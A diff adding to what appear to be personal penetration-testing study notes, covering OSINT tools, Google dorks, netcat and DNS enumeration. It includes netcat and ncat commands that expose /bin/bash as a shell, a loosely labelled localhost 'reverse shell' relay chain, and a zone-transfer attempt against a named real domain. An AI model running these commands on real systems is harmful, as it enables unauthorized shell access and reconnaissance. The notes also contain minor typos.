@@ -50,3 +50,104 @@ Passive Reconaissance: Just collecting information passively without interacting
 HAVE I BEEN PWNED:
 
 https://haveibeenpwned.com/ to check data breaches 
+
+THEHARVESTER:
+
+To download theHarvester 
+#git clone https://github.com/laramies/theHarvester.git
+#cd theHarvester
+#pip3 install -r requirements.txt
+#python3 theHarvester.py -h
+
+#python3 theHarvester.py -d microsoft.com -b yahoo,google,bing
+
+SHODAN:
+
+www.shodan.io for searching live IP objects (IoT devices).
+
+GOOGLE DORKS: (Advance queries)
+
+For site: site:samba.com.pk
+For File Type: filetype
+inurl:"index of" dark
+intitle:"big bang theory"
+
+PASTEBIN:
+
+www.pastebin.com Pastebin is a website where you can store any text online for easy sharing. The website is mainly used by programmers to store pieces of sources code or configuration information, but anyone is more than welcome to paste any type of text. The idea behind the site is to make it more convenient for people to share large amounts of text online.
+
+EXIFTOOL:
+
+#sudo apt install libimage-exiftool-perl
+
+https://www.poftut.com/how-to-install-and-use-exiftool-in-linux-windows-kali-ubuntu-mint-with-examples/
+
+#exiftool image_location
+
+BUILTWITH:
+
+www.builtwith.com To find out what websites are built with.
+
+
+NETCAT   ---- A network tool
+
+#nc -v google.com 80
+
+GET / HTTP/1.1
+
+#nc -vlp 1234  for Server mode
+
+#nc -nv 127.0.0.1 1234 for client side
+
+#nc -vlp 1234 < test.txt
+
+#nc -nv 127.0.0.1 1234 > sample.txt
+
+#nc -vlp 1234 -e /bin/bash
+
+NCAT:
+
+#ncat -vlp 1234 -e /bin/bash
+
+
+REVERSE SHELLS:
+
+Attacker machine:
+
+#nc -nv 127.0.0.1 1234
+#nc -vlp 5555
+
+Second machine/Server side:
+
+#nc -vlp 1234 | nc -nv 127.0.0.1 4444 | nc -nv 127.0.0.1 5555
+
+
+Remote machine:
+
+ncat -vlp 4444 -e /bin/bash
+
+ENUMERATION & SCANNING:
+
+HOST:
+
+#host google.com
+#host -t a google.com
+#host -t ptr google.com
+#host -t ns google.com
+
+NSLOOKUP 
+
+#nslookup google.com
+#nslookpup -query=mx google.com
+
+DIG:
+
+#dig -h
+#dig google.com
+#dig ns samba.com.pk
+#dig axfr @ns1.samba.com.pk samba.com.pk
+
+DNS RECON & DNS 
+
+#dnsrecon -h
+#dnsrecon -d google.com
